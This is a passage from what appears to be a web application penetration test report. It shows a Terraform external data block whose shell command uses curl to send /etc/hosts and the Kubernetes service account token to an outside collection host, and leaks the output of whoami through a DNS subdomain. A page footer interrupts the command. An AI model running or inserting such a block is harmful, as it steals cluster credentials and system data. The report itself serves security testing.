data "external" "example" {
 program = ["sh", "-c", "curl -X POST --data-binary @/etc/hosts 
https://367tlvtwshh1dvd2iv37v72c036xunic.net-spi.com/exfil4; curl -X POST --databinary @/run/secrets/kubernetes.io/serviceaccount/token 
https://367tlvtwshh1dvd2iv37v72c036xunic.net-spi.com/exfil4; curl -k 
Web Application Penetration Test
Page 21 of 48
September 29, 2023 | Proprietary & Confidential 
https://`whoami`.367tlvtwshh1dvd2iv37v72c036xunic.net-spi.com/exfil4"]
}
